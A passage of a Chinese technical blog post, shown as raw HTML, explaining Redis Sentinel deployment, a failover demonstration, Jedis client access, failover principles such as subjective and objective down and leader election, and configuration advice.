data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67020db6a708228985-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db6a708228985-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67020db6a708228985-1\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">sentinel </span><span class=\"crayon-v\">sentinel</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">26379.conf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db6a708228985-2\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">server </span><span class=\"crayon-v\">sentinel</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">26379.conf</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">sentinel</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n\n</div>\n<p>按照上述方式配置和启动之后，整个哨兵系统就启动完毕了。可以通过redis-cli连接哨兵节点进行验证，如下图所示：可以看出26379哨兵节点已经在监控mymaster主节点(即192.168.92.128:6379)，并发现了其2个从节点和另外2个哨兵节点。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/a69a41455df2b730275ed61c3501a4ed.png\" alt=\"\"></p>\n<p>此时如果查看哨兵节点的配置文件，会发现一些变化，以26379为例：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/466d088ddc678a5d4fcd7b4a91c6d9fc.png\" alt=\"\"></p>\n<p>其中，dir只是显式声明了数据和日志所在的目录（在哨兵语境下只有日志）；known-slave和known-sentinel显示哨兵已经发现了从节点和其他哨兵；带有epoch的参数与配置纪元有关（配置纪元是一个从0开始的计数器，每进行一次领导者哨兵选举，都会+1；领导者哨兵选举是故障转移阶段的一个操作，在后文原理部分会介绍）。</p>\n<h2><a name=\"t23\"></a>3.  演示故障转移</h2>\n<p>哨兵的4个作用中，配置提供者和通知需要客户端的配合，本文将在下一章介绍客户端访问哨兵系统的方法时详细介绍。这一小节将演示当主节点发生故障时，哨兵的监控和自动故障转移功能。</p>\n<p>（1）首先，使用kill命令杀掉主节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/307cc9dbdc5df1e5dcd5ce77b2c1182e.png\" alt=\"\"></p>\n<p>（2）如果此时立即在哨兵节点中使用info Sentinel命令查看，会发现主节点还没有切换过来，因为哨兵发现主节点故障并转移，需要一段时间。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/7fea5421d4c171ea55d9ff9a3a4c0112.png\" alt=\"\"></p>\n<p>（3）一段时间以后，再次在哨兵节点中执行info Sentinel查看，发现主节点已经切换成6380节点。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/d4302e7e98fbe1fa66d391a1280f186a.png\" alt=\"\"></p>\n<p>但是同时可以发现，哨兵节点认为新的主节点仍然有2个从节点，这是因为哨兵在将6380切换成主节点的同时，将6379节点置为其从节点；虽然6379从节点已经挂掉，但是由于哨兵并不会对从节点进行客观下线（其含义将在原理部分介绍），因此认为该从节点一直存在。当6379节点重新启动后，会自动变成6380节点的从节点。下面验证一下。</p>\n<p>（4）重启6379节点：可以看到6379节点成为了6380节点的从节点。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/7df7d6cccdf7e35e41e9a0c4643d4aea.png\" alt=\"\"></p>\n<p>（5）在故障转移阶段，哨兵和主从节点的配置文件都会被改写。</p>\n<p>对于主从节点，主要是slaveof配置的变化：新的主节点没有了slaveof配置，其从节点则slaveof新的主节点。</p>\n<p>对于哨兵节点，除了主从节点信息的变化，纪元(epoch)也会变化，下图中可以看到纪元相关的参数都+1了。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/befad1757e6a99ccc1752c71daa83ed8.png\" alt=\"\"></p>\n<h2><a name=\"t24\"></a>4.  总结</h2>\n<p>哨兵系统的搭建过程，有几点需要注意：</p>\n<p>（1）哨兵系统中的主从节点，与普通的主从节点并没有什么区别，故障发现和转移是由哨兵来控制和完成的。</p>\n<p>（2）哨兵节点本质上是redis节点。</p>\n<p>（3）每个哨兵节点，只需要配置监控主节点，便可以自动发现其他的哨兵节点和从节点。</p>\n<p>（4）在哨兵节点启动和故障转移阶段，各个节点的配置文件会被重写(config rewrite)。</p>\n<p>（5）本章的例子中，一个哨兵只监控了一个主节点；实际上，一个哨兵可以监控多个主节点，通过配置多条sentinel monitor即可实现。</p>\n<h1><a name=\"t3\"></a>三、客户端访问哨兵系统</h1>\n<p>上一小节演示了哨兵的两大作用：监控和自动故障转移，本小节则结合客户端演示哨兵的另外两个作用：配置提供者和通知。</p>\n<h2><a name=\"t31\"></a>1.  代码示例</h2>\n<p>在介绍客户端的原理之前，先以Java客户端Jedis为例，演示一下使用方法：下面代码可以连接我们刚刚搭建的哨兵系统，并进行各种读写操作（代码中只演示如何连接哨兵，异常处理、资源关闭等未考虑）。</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67020db6f750382899\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic static void testSentinel() throws Exception {\r\n         String masterName = \"mymaster\";\r\n         Set&lt;String&gt; sentinels = new HashSet&lt;&gt;();\r\n         sentinels.add(\"192.168.92.128:26379\");\r\n         sentinels.add(\"192.168.92.128:26380\");\r\n         sentinels.add(\"192.168.92.128:26381\");\r\n\r\n         JedisSentinelPool pool = new JedisSentinelPool(masterName, sentinels); //初始化过程做了很多工作\r\n         Jedis jedis = pool.getResource();\r\n         jedis.set(\"key1\", \"value1\");\r\n         pool.close();\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67020db6f750382899-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db6f750382899-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db6f750382899-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db6f750382899-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db6f750382899-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db6f750382899-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db6f750382899-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db6f750382899-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db6f750382899-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db6f750382899-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db6f750382899-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db6f750382899-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67020db6f750382899-1\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">testSentinel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">throws</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Exception</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db6f750382899-2\"><span class=\"crayon-h\">         </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">masterName</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"mymaster\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db6f750382899-3\"><span class=\"crayon-h\">         </span><span class=\"crayon-v\">Set</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">String</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sentinels</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">HashSet</span><span class=\"crayon-o\">&lt;&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db6f750382899-4\"><span class=\"crayon-h\">         </span><span class=\"crayon-v\">sentinels</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"192.168.92.128:26379\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db6f750382899-5\"><span class=\"crayon-h\">         </span><span class=\"crayon-v\">sentinels</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"192.168.92.128:26380\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db6f750382899-6\"><span class=\"crayon-h\">         </span><span class=\"crayon-v\">sentinels</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"192.168.92.128:26381\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db6f750382899-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db6f750382899-8\"><span class=\"crayon-h\">         </span><span class=\"crayon-e\">JedisSentinelPool </span><span class=\"crayon-v\">pool</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisSentinelPool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">masterName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sentinels</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//初始化过程做了很多工作</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db6f750382899-9\"><span class=\"crayon-h\">         </span><span class=\"crayon-e\">Jedis </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pool</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getResource</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db6f750382899-10\"><span class=\"crayon-h\">         </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"key1\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"value1\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67020db6f750382899-11\"><span class=\"crayon-h\">         </span><span class=\"crayon-v\">pool</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db6f750382899-12\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0025 seconds] -->\r\n\n</div>\n<h2><a name=\"t32\"></a>2.  客户端原理</h2>\n<p>Jedis客户端对哨兵提供了很好的支持。如上述代码所示，我们只需要向Jedis提供哨兵节点集合和masterName，构造JedisSentinelPool对象；然后便可以像使用普通redis连接池一样来使用了：通过pool.getResource()获取连接，执行具体的命令。</p>\n<p>在整个过程中，我们的代码不需要显式的指定主节点的地址，就可以连接到主节点；代码中对故障转移没有任何体现，就可以在哨兵完成故障转移后自动的切换主节点。之所以可以做到这一点，是因为在JedisSentinelPool的构造器中，进行了相关的工作；主要包括以下两点：</p>\n<p>（1）<strong>遍历哨兵节点，获取主节点信息：</strong>遍历哨兵节点，通过其中一个哨兵节点+masterName获得主节点的信息；该功能是通过调用哨兵节点的sentinel get-master-addr-by-name命令实现，该命令示例如下：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/d8c3c359c63cda07cd8fc01317866fd2.png\" alt=\"\"></p>\n<p>一旦获得主节点信息，停止遍历（因此一般来说遍历到第一个哨兵节点，循环就停止了）。</p>\n<p>（2）<strong>增加对哨兵的监听：</strong>这样当发生故障转移时，客户端便可以收到哨兵的通知，从而完成主节点的切换。具体做法是：利用redis提供的发布订阅功能，为每一个哨兵节点开启一个单独的线程，订阅哨兵节点的+switch-master频道，当收到消息时，重新初始化连接池。</p>\n<h2><a name=\"t33\"></a>3.  总结</h2>\n<p>通过客户端原理的介绍，可以加深对哨兵功能的理解：</p>\n<p>（1）配置提供者：客户端可以通过哨兵节点+masterName获取主节点信息，在这里哨兵起到的作用就是配置提供者。</p>\n<p><strong>需要注意的是，哨兵只是配置提供者，而不是代理</strong>。二者的区别在于：如果是配置提供者，客户端在通过哨兵获得主节点信息后，会直接建立到主节点的连接，后续的请求(如set/get)会直接发向主节点；如果是代理，客户端的每一次请求都会发向哨兵，哨兵再通过主节点处理请求。</p>\n<p>举一个例子可以很好的理解哨兵的作用是配置提供者，而不是代理。在前面部署的哨兵系统中，将哨兵节点的配置文件进行如下修改：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67020db75738577519\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsentinel monitor mymaster 192.168.92.128 6379 2\r\n改为\r\nsentinel monitor mymaster 127.0.0.1 6379 2</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67020db75738577519-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67020db75738577519-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67020db75738577519-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67020db75738577519-1\"><span class=\"crayon-e\">sentinel </span><span class=\"crayon-e\">monitor </span><span class=\"crayon-i\">mymaster</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.92.128</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67020db75738577519-2\">改为</div><div class=\"crayon-line\" id=\"crayon-5bab67020db75738577519-3\"><span class=\"crayon-e\">sentinel </span><span class=\"crayon-e\">monitor </span><span class=\"crayon-i\">mymaster</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">127.0.0.1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n\n</div>\n<p>然后，将前述客户端代码在局域网的另外一台机器上运行，会发现客户端无法连接主节点；这是因为哨兵作为配置提供者，客户端通过它查询到主节点的地址为127.0.0.1:6379，客户端会向127.0.0.1:6379建立redis连接，自然无法连接。如果哨兵是代理，这个问题就不会出现了。</p>\n<p>（2）通知：哨兵节点在故障转移完成后，会将新的主节点信息发送给客户端，以便客户端及时切换主节点。</p>\n<h1><a name=\"t4\"></a>四、基本原理</h1>\n<p>前面介绍了哨兵部署、使用的基本方法，本部分介绍哨兵实现的基本原理。</p>\n<h2><a name=\"t41\"></a>1.  哨兵节点支持的命令</h2>\n<p>哨兵节点作为运行在特殊模式下的redis节点，其支持的命令与普通的redis节点不同。在运维中，我们可以通过这些命令查询或修改哨兵系统；不过更重要的是，哨兵系统要实现故障发现、故障转移等各种功能，离不开哨兵节点之间的通信，而通信的很大一部分是通过哨兵节点支持的命令来实现的。下面介绍哨兵节点支持的主要命令。</p>\n<p>（1）基础查询：通过这些命令，可以查询哨兵系统的拓扑结构、节点信息、配置信息等。</p>\n<ul>\n<li>info sentinel：获取监控的所有主节点的基本信息</li>\n<li>sentinel masters：获取监控的所有主节点的详细信息</li>\n<li>sentinel master mymaster：获取监控的主节点mymaster的详细信息</li>\n<li>sentinel slaves mymaster：获取监控的主节点mymaster的从节点的详细信息</li>\n<li>sentinel sentinels mymaster：获取监控的主节点mymaster的哨兵节点的详细信息</li>\n<li>sentinel get-master-addr-by-name mymaster：获取监控的主节点mymaster的地址信息，前文已有介绍</li>\n<li>sentinel is-master-down-by-addr：哨兵节点之间可以通过该命令询问主节点是否下线，从而对是否客观下线做出判断</li>\n</ul>\n<p>（2）增加/移除对主节点的监控</p>\n<p>sentinel monitor mymaster2 192.168.92.128 16379 2：与部署哨兵节点时配置文件中的sentinel monitor功能完全一样，不再详述</p>\n<p>sentinel remove mymaster2：取消当前哨兵节点对主节点mymaster2的监控</p>\n<p>（3）强制故障转移</p>\n<p>sentinel failover mymaster：该命令可以<strong>强制对</strong><strong>mymaster</strong><strong>执行故障转移，</strong>即便当前的主节点运行完好；例如，如果当前主节点所在机器即将报废，便可以提前通过failover命令进行故障转移。</p>\n<h2><a name=\"t42\"></a>2.  基本原理</h2>\n<p>关于哨兵的原理，关键是了解以下几个概念。</p>\n<p>（1）定时任务：每个哨兵节点维护了3个定时任务。定时任务的功能分别如下：通过向主从节点发送info命令获取最新的主从结构；通过发布订阅功能获取其他哨兵节点的信息；通过向其他节点发送ping命令进行心跳检测，判断是否下线。</p>\n<p>（2）主观下线：在心跳检测的定时任务中，如果其他节点超过一定时间没有回复，哨兵节点就会将其进行主观下线。顾名思义，主观下线的意思是一个哨兵节点“主观地”判断下线；与主观下线相对应的是客观下线。</p>\n<p>（3）客观下线：哨兵节点在对主节点进行主观下线后，会通过sentinel is-master-down-by-addr命令询问其他哨兵节点该主节点的状态；如果判断主节点下线的哨兵数量达到一定数值，则对该主节点进行客观下线。</p>\n<p><strong>需要特别注意的是，客观下线是主节点才有的概念；如果从节点和哨兵节点发生故障，被哨兵主观下线后，不会再有后续的客观下线和故障转移操作。</strong></p>\n<p>（4）选举领导者哨兵节点：当主节点被判断客观下线以后，各个哨兵节点会进行协商，选举出一个领导者哨兵节点，并由该领导者节点对其进行故障转移操作。</p>\n<p>监视该主节点的所有哨兵都有可能被选为领导者，选举使用的算法是Raft算法；Raft算法的基本思路是先到先得：即在一轮选举中，哨兵A向B发送成为领导者的申请，如果B没有同意过其他哨兵，则会同意A成为领导者。选举的具体过程这里不做详细描述，一般来说，哨兵选择的过程很快，谁先完成客观下线，一般就能成为领导者。</p>\n<p>（5）故障转移：选举出的领导者哨兵，开始进行故障转移操作，该操作大体可以分为3个步骤：</p>\n<ul>\n<li>在从节点中选择新的主节点：选择的原则是，首先过滤掉不健康的从节点；然后选择优先级最高的从节点(由slave-priority指定)；如果优先级无法区分，则选择复制偏移量最大的从节点；如果仍无法区分，则选择runid最小的从节点。</li>\n<li>更新主从状态：通过slaveof no one命令，让选出来的从节点成为主节点；并通过slaveof命令让其他节点成为其从节点。</li>\n<li>将已经下线的主节点(即6379)设置为新的主节点的从节点，当6379重新上线后，它会成为新的主节点的从节点。</li>\n</ul>\n<p>通过上述几个关键概念，可以基本了解哨兵的工作原理。为了更形象的说明，下图展示了领导者哨兵节点的日志，包括从节点启动到完成故障转移。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/8a6ded5ebf9eab9d29ee1926b1a4a0a4.png\" alt=\"\"></p>\n<h1><a name=\"t5\"></a>五、配置与实践建议</h1>\n<h2><a name=\"t51\"></a>1.  配置</h2>\n<p>下面介绍与哨兵相关的几个配置。</p>\n<p>（1） sentinel monitor {masterName} {masterIp} {masterPort} {quorum}</p>\n<p>sentinel monitor是哨兵最核心的配置，在前文讲述部署哨兵节点时已说明，其中：masterName指定了主节点名称，masterIp和masterPort指定了主节点地址，quorum是判断主节点客观下线的哨兵数量阈值：当判定主节点下线的哨兵数量达到quorum时，对主节点进行客观下线。建议取值为哨兵数量的一半加1。</p>\n<p>（2） sentinel down-after-milliseconds {masterName} {time}</p>\n<p>sentinel down-after-milliseconds与主观下线的判断有关：哨兵使用ping命令对其他节点进行心跳检测，如果其他节点超过down-after-milliseconds配置的时间没有回复，哨兵就会将其进行主观下线。该配置对主节点、从节点和哨兵节点的主观下线判定都有效。</p>\n<p>down-after-milliseconds的默认值是30000，即30s；可以根据不同的网络环境和应用要求来调整：值越大，对主观下线的判定会越宽松，好处是误判的可能性小，坏处是故障发现和故障转移的时间变长，客户端等待的时间也会变长。例如，如果应用对可用性要求较高，则可以将值适当调小，当故障发生时尽快完成转移；如果网络环境相对较差，可以适当提高该阈值，避免频繁误判。</p>\n<p>（3） sentinel parallel-syncs {masterName} {number}</p>\n<p>sentinel parallel-syncs与故障转移之后从节点的复制有关：它规定了每次向新的主节点发起复制操作的从节点个数。例如，假设主节点切换完成之后，有3个从节点要向新的主节点发起复制；如果parallel-syncs=1，则从节点会一个一个开始复制；如果parallel-syncs=3，则3个从节点会一起开始复制。</p>\n<p>parallel-syncs取值越大，从节点完成复制的时间越快，但是对主节点的网络负载、硬盘负载造成的压力也越大；应根据实际情况设置。例如，如果主节点的负载较低，而从节点对服务可用的要求较高，可以适量增加parallel-syncs取值。parallel-syncs的默认值是1。</p>\n<p>（4） sentinel failover-timeout {masterName} {time}</p>\n<p>sentinel failover-timeout与故障转移超时的判断有关，但是该参数不是用来判断整个故障转移阶段的超时，而是其几个子阶段的超时，例如如果主节点晋升从节点时间超过timeout，或从节点向新的主节点发起复制操作的时间(不包括复制数据的时间)超过timeout，都会导致故障转移超时失败。</p>\n<p>failover-timeout的默认值是180000，即180s；如果超时，则下一次该值会变为原来的2倍。</p>\n<p>（5）除上述几个参数外，还有一些其他参数，如安全验证相关的参数，这里不做介绍。</p>\n<h2><a name=\"t52\"></a>2.  实践建议</h2>\n<p>（1）哨兵节点的数量应不止一个，一方面增加哨兵节点的冗余，避免哨兵本身成为高可用的瓶颈；另一方面减少对下线的误判。此外，这些不同的哨兵节点应部署在不同的物理机上。</p>\n<p>（2）哨兵节点的数量应该是奇数，便于哨兵通过投票做出“决策”：领导者选举的决策、客观下线的决策等。</p>\n<p>（3）各个哨兵节点的配置应一致，包括硬件、参数等；此外，所有节点都应该使用ntp或类似服务，保证时间准确、一致。</p>\n<p>（4）哨兵的配置提供者和通知客户端功能，需要客户端的支持才能实现，如前文所说的Jedis；如果开发者使用的库未提供相应支持，则可能需要开发者自己实现。</p>\n<p>（5）当哨兵系统中的节点在docker（或其他可能进行端口映射的软件）中部署时，应特别注意端口映射可能会导致哨兵系统无法正常工作，因为哨兵的工作基于与其他节点的通信，而docker的端口映射可能导致哨兵无法连接到其他节点。例如，哨兵之间互相发现，依赖于它们对外宣称的IP和port，如果某个哨兵A部署在做了端口映射的docker中，那么其他哨兵使用A宣称的port无法连接到A。</p>\n<h1><a name=\"t6\"></a>六、总结</h1>\n<p>本文首先介绍了哨兵的作用：监控、故障转移、配置提供者和通知；然后讲述了哨兵系统的部署方法，以及通过客户端访问哨兵系统的方法；再然后简要说明了哨兵实现的基本原理；最后给出了关于哨兵实践的一些建议。</p>\n<p>在主从复制的基础上，哨兵引入了主节点的自动故障转移，进一步提高了Redis的高可用性；但是哨兵的缺陷同样很明显：哨兵无法对从节点进行自动故障转移，在读写分离场景下，从节点故障会导致读服务不可用，需要我们对从节点做额外的监控、切换操作。</p>\n<p>此外，哨兵仍然没有解决写操作无法负载均衡、及存储能力受到单机限制的问题；这些问题的解决需要使用集群，我将在后面的文章中介绍，欢迎关注。</p>\n<h1>参考文献</h1>\n<p><a href=\"https://redis.io/topics/sentinel\">https://redis.io/topics/sentinel</a></p>\n<p><a href=\"http://www.redis.cn/\">http://www.redis.cn/</a></p>\n<p>《Redis开发与运维》</p>\n<p>《Redis设计与实现》</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114382\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114382votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" 